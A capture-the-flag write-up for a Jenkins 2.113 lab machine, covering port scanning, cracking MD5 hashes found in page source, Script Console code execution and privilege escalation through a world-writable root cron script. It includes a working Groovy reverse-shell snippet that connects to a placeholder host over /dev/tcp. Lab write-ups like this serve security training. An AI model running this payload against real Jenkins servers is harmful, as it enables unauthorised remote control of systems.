# Maq156: Jarbas (Jenkins)

> **Platform:** SEC4US CTF Lab | **Category:** Web Hacking: Medium | **Points:** Dynamic

## Overview

A machine running Jenkins 2.113 with exposed credential hashes and a writable cron job for privilege escalation.

---

## Approach

**Technique:** Jenkins Exploitation + Cron Privesc

### Reconnaissance

```bash
nmap -sV -sC -p- <TARGET_IP> -oN nmap_full.txt
```

Port scan reveals Apache (80) and Jenkins (8080).

### Exploitation

1. **Hash discovery:** An HTML page on port 80 contains MD5 hashes in the source code
2. **Hash cracking:** Crack the MD5 hashes to obtain valid Jenkins credentials
3. **Jenkins admin access:** Log in to Jenkins at port 8080 with the cracked credentials
4. **Groovy Script Console RCE:** Use the Script Console (`/script`) to execute Groovy reverse shell code:
   ```groovy
   r = Runtime.getRuntime()
   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
   p.waitFor()
   ```
5. **Cron privesc:** Discover a cron job running as root that executes a world-writable cleanup script
6. **Root shell:** Inject a reverse shell command into the cron script and wait for execution

### Tools Used

nmap, hashcat/john (MD5), Jenkins Script Console, netcat

---

## Security Frameworks

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1078 | Valid Accounts |
| T1059.004 | Unix Shell |
| T1053.003 | Cron |

### CWE

| ID | Description |
|----|-------------|
| CWE-916 | Use of Password Hash With Insufficient Effort |
| CWE-732 | Incorrect Permission Assignment |

---

## Author

**Andre Henrike** (@mrhenrike)

Jenkins without authentication is not a CI/CD pipeline; it is a remote shell as a service. Thanks guys!! (❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike

---

*For educational purposes only. Do not use any technique shown here against systems you do not own or have explicit permission to test.*
